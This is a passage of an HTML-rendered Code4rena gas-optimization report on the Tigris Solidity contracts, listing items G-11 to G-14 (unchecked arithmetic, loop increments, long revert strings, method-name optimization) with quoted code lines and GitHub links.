class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">89</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_transfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">90            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">91            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">92:           </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L89-L92</p>\n<h2 id=\"g11--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" style=\"position:relative;\"><a href=\"#g11--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" aria-label=\"g11  add unchecked  for subtractions where the operands cannot underflow because of a previous require or if statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑11]  Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</h2>\n<p><code>require(a &#x3C;= b); x = b - a</code> => <code>require(a &#x3C;= b); unchecked { x = b - a }</code></p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit if-condition on line 615</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">616</span><span class=\"mtk1\">:              </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\">*</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">*(</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">-</span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">)/</span><span class=\"mtk12\">DIVISION_CONSTANT</span><span class=\"mtk1\">)/</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">tradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk11\">minPos</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">)) </span><span class=\"mtk11\">revert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;!size&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L616</p>\n<h2 id=\"g12--ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" style=\"position:relative;\"><a href=\"#g12--ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for--and-while-loops\" aria-label=\"g12  ii should be uncheckediuncheckedi when it is not possible for them to overflow as is the case when used in for  and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑12]  <code>++i</code>/<code>i++</code> should be <code>unchecked{++i}</code>/<code>unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in <code>for</code>- and <code>while</code>-loops</h2>\n<p>The <code>unchecked</code> keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves <strong>30-40 gas <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked\">per loop</a></strong></p>\n<p><em>There are 16 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">53</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">95</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk11\">assetsLength</span><span class=\"mtk1\">(); </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">246</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">325</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L53</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">304</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_ids</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_codeOwnersL</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">73</span><span class=\"mtk1\">:           </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">_referredAL</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L70</p>\n<h2 id=\"g13--requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" style=\"position:relative;\"><a href=\"#g13--requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" aria-label=\"g13  requirerevert strings longer than 32 bytes cost extra gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑13]  <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</h2>\n<p>Each extra memory word of bytes past the original 32 <a href=\"https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings\">incurs an MSTORE</a> which costs <strong>3 gas</strong></p>\n<p><em>There are 4 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"117\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">               </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">messageFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">               </span><span class=\"mtk8\">&quot;Must send enough value to cover messageFee&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:          );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;NonblockingLzApp: caller must be app&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payloadHash</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;NonblockingLzApp: no stored message&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">210</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_payload</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">payloadHash</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;NonblockingLzApp: invalid payload&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L153-L156</p>\n<h2 id=\"g14--optimize-names-to-save-gas\" style=\"position:relative;\"><a href=\"#g14--optimize-names-to-save-gas\" aria-label=\"g14  optimize names to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑14]  Optimize names to save gas</h2>\n<p><code>public</code>/<code>external</code> function names and <code>public</code> member variable names can be optimized to save gas. See <a href=\"https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9\">this</a> link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save <strong>128 gas</strong> each during deployment, and renaming functions to have lower method IDs will save <strong>22 gas</strong> per call, <a href=\"https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\">per sorted position shifted</a></p>\n<p><em>There are 25 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit createLock(), extendLock(), release(), claim(), claimDebt(), distribute(), idToBond(), isExpired(), pending(), getAssets(), safeTransferMany(), safeTransferFromMany(), approveMany(), balanceIds(), addAsset(), setAllowedAsset(), setBaseURI(), setManager()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L8</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit setBaseURI(), _bridgeMint(), mintMany(), setTrustedAddress(), crossChain(), nonblockingLzReceive(), retryMessage(), estimateFees(), setGas(), setEndpoint(), safeTransferMany(), safeTransferFromMany(), approveMany(), claim(), distribute(), pending(), addAsset(), setAllowedAsset(), setMaxBridge(), assetsLength(), allowedAsset(), balanceIds()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ILayerZeroReceiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MetaContext</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IGovNFT</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L12</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IBondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit createLock(), extendLock(), claim(), claimDebt(), release(), distribute(), ownerOf(), getAssets()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">4</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">interface</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IBondNFT</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IBondNFT.sol#L4</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IGovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span 